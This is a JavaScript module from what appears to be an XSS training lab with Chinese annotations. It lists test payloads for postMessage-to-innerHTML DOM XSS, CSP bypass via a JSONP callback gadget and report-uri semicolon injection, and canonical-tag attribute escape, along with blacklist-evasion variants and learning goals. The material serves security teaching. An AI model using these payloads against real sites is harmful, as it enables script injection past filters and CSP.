export const LAB_OPTIONS = [
  { value: 'postmessage', label: 'PostMessage 链（XSS-Sec L16）' },
  { value: 'csp_jsonp', label: 'CSP + JSONP gadget（XSS-Sec L17）' },
  { value: 'canonical', label: 'Canonical 属性逃逸（XSS-Sec L26）' },
];

export const MODE_OPTIONS = [
  { value: 'vuln', label: 'VULN' },
  { value: 'weak', label: 'WEAK' },
  { value: 'safe', label: 'SAFE' },
];

export function contextIdByLab(lab) {
  if (lab === 'csp_jsonp') return 'xss_csp_jsonp_gadget';
  if (lab === 'canonical') return 'xss_seo_canonical_attr_escape';
  return 'xss_dom_postmessage_innerHTML';
}

export function getPayloadItems(lab) {
  if (lab === 'postmessage') {
    return [
      {
        kind: '对照（WEAK-2 会拦）',
        expect:
          '走“自测同链路”稳定版：后端把 keyword 当作消息写入 out。WEAK-2 黑名单会拦 javascript: 子串，因此该输入会被拦截并显示提示。',
        value: '<img src=x onerror="javascript:alert(1)">',
      },
      {
        kind: '验证（WEAK-2 仍可绕过）',
        expect:
          '走“自测同链路”稳定版：黑名单只拦 <script/javascript:，不拦事件属性，因此仍可触发（应弹窗）。',
        value: '<img src=x onerror=alert(1)>',
      },
      {
        kind: '变体（另一种绕过）',
        expect: '另一种常见载体：svg/onload（也不依赖 <script>）。',
        value:
          "data:text/html,%3Cscript%3EsetTimeout%28function%28%29%7Bparent.postMessage%28%22%3Csvg%20onload%3Dalert%281%29%3E%3C%2Fsvg%3E%22%2C%27%2A%27%29%7D%2C50%29%3C%2Fscript%3E",
      },
      {
        kind: '对照',
        expect: '不弹窗，只显示 Received: hello',
        value: 'hello',
      },
      {
        kind: '提示',
        expect: '为什么只收字符串：开发环境可能有插件/HMR 发对象消息，容易污染训练信号',
        value: '[debug] message as string',
      },
    ];
  }
  if (lab === 'csp_jsonp') {
    return [
      {
        kind: '对照',
        expect: '通常不会弹窗（被 CSP 拦截），控制台会看到 CSP 违规提示',
        value: '<script>alert(1)</script>',
      },
      {
        kind: '验证',
        expect: 'VULN/WEAK：应弹窗（JSONP gadget）。SAFE 会把 callback 收敛到固定 cb，不应弹窗（可能有 console error）。',
        value: '<script src="?callback=alert"></script>',
      },
      {
        kind: 'WEAK（对照）',
        expect: 'WEAK-1：关键字替换黑名单可被 bracket+拼接绕过（JSONP 会调用 callback 并传入对象）',
        value: "<script src=\"?callback=window[\\'al\\'+\\'ert\\']\"></script>",
      },
      {
        kind: 'WEAK-2（新分支）',
        expect:
          "report-uri 拼接注入：WEAK-2 把调试 token 直接拼进 CSP 的 report-uri（更真实：不在页面表单里提供 token，需要你手动在 URL 追加 &token=...）。用分号注入 script-src-elem 'unsafe-inline' 复活 inline 脚本，应弹窗。",
        value: '<script>alert(1)</script>',
        token: ";script-src-elem 'unsafe-inline'",
      },
    ];
  }
  return [
    {
      kind: '验证',
      expect: '运行后查看预览页源代码：canonical 标签应出现 onclick；并尝试触发（页面会自动触发一次）',
      value: "%27onclick=%27alert(1)%27x=%27",
    },
    {
      kind: '验证',
      expect: '同上（只是更明显的属性注入形态）',
      value: "%27onclick=%27alert(1)%27style=%27display:block%27x=%27",
    },
    {
      kind: '对照',
      expect: '不会发生变化（用于确认你输入确实进入 canonical）',
      value: 'foo=bar',
    },
  ];
}

export function getLabGoal(lab) {
  if (lab === 'postmessage') {
    return '学习目标：理解 postMessage 的信任边界（origin/source），以及为什么把消息写入 innerHTML 会触发 DOM XSS；SAFE 应改为 origin 校验 + textContent。';
  }
  if (lab === 'csp_jsonp') {
    return '目标：理解 CSP 禁止 inline 后，为什么同源 JSONP 会变成可利用的脚本 gadget。';
  }
  return '目标：理解“转义选项/引号处理错误”如何导致属性逃逸（建议查看页面源代码）。';
}
